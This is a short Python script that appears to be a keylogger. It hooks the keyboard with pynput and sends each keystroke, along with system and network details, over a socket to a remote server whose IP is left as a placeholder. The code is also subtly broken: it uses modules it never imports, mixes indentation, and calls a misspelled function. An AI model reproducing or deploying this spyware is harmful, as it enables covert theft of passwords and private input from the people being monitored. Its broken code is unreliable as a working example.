import socket
from pynput import keyboard

SERVER_IP = "YOUR_SERVER_IP"  # Replace with your server/public IP
SERVER_PORT = 4444

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_IP, SERVER_PORT))

def system_info():
    info = []
    info.append(f"System: {platform.system()} {platform.release()}")
    info.append(f"Version: {platform.version()}")
    info.append(f"Machine: {platform.machine()}")
    info.append(f"Processor: {platform.processor()}")
    info.append(f"CPU Cores: {psutil.cpu_count(logical=True)}")
    info.append(f"Memory: {round(psutil.virtual_memory().total / (1024**3),2)} GB")
    return "\n".join(info)

# -------------------------
# Step 2: Collect Network Info
# -------------------------
def network_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        return f"Hostname: {hostname}\nLocal IP: {local_ip}"
    except:
        return "Network info not available"

def on_press(key):
    try:
        client.send(str(key.char).encode("utf-8"))
	client.send(system_info().encode("utf-8"))
	client.send(network.info().encode("utf-8"))
	
    except AttributeError:
        client.send(str(key).encode("utf-8"))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
